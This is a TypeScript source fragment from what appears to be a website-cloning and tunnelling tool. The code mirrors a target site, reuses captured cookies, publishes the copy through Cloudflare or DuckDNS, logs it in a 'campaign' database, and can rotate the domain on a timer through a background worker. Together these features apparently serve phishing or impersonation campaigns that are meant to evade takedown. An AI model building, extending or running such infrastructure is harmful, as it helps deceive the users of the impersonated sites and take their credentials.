    logCloneOutcome(cli.targetUrl, 'cex-static', true, Date.now() - cloneStart).catch(() => {})
  } else {
    const fallback = await runMirrorFallbackChain({
      repoRoot: REPO_ROOT,
      outDir,
      targetUrl: cli.targetUrl,
      port: mirrorHostPort,
      godMode: cli.godMode,
      forceHardwareBypass: cli.forceHardwareBypass,
      backendUrl: BACKEND_URL,
      pipelineCookies: pipeline?.cookies,
      homepageHtml: pipeline?.html,
      runCommand,
      generateTimeoutMs: GENERATE_TIMEOUT_MS,
      brainRecommendation: brainRec,
    })
    console.error(
      `[clone-tunnel] Mirror ready: method=${fallback.method} stack=${fallback.stackMode}` +
        (fallback.errors.length ? ` (prior errors: ${fallback.errors.length})` : ''),
    )
    // Phase 2: record outcome for learning loop
    logCloneOutcome(cli.targetUrl, fallback.method, fallback.method !== 'placeholder', Date.now() - cloneStart).catch(() => {})
  }

  let publicUrl: string
  let fqdn: string | undefined
  let recordId: string | undefined
  let provider = 'trycloudflare'

  const dns = await resolveDnsMirrorUrl({
    outDir,
    rotate: cli.rotate,
    godMode: cli.godMode,
    targetUrl: cli.targetUrl,
    subdomain: cli.subdomain,
    force: cli.force,
  })
  publicUrl = dns.url
  fqdn = dns.fqdn
  recordId = dns.recordId
  provider = dns.provider

  if (provider === 'cloudflare' || provider === 'duckdns') {
    console.error(
      `[clone-tunnel] DNS mirror at ${publicUrl} — ensure port ${mirrorHostPort} is reachable on VPS`,
    )
  }

  if (!PUBLIC_URL_RE.test(publicUrl)) {
    fail(`Invalid public URL: ${publicUrl}`)
  }

  const campaignId = await updateCampaignDb(cli, publicUrl, fqdn)

  if (cli.rotate && (provider === 'cloudflare' || provider === 'duckdns')) {
    const state: RotationState = {
      campaignId,
      targetUrl: cli.targetUrl,
      intervalHours: cli.rotateHours,
      provider: provider === 'cloudflare' ? 'cloudflare' : 'duckdns',
      duckdnsSubdomain: cli.subdomain,
      lastRecordId: recordId,
      lastMirrorUrl: `${publicUrl}/`,
      lastFqdn: fqdn ?? publicUrl.replace(/^https:\/\//, ''),
      startedAt: new Date().toISOString(),
    }
    const statePath = path.join(outDir, '.legion-rotate-state.json')
    await writeFile(statePath, `${JSON.stringify(state, null, 2)}\n`, 'utf8')
    spawnRotationWorker(outDir, state)
  }

  process.stdout.write(`${publicUrl}\n`)
}

main().catch((e) => {
  fail(e instanceof Error ? e.message : String(e))
})
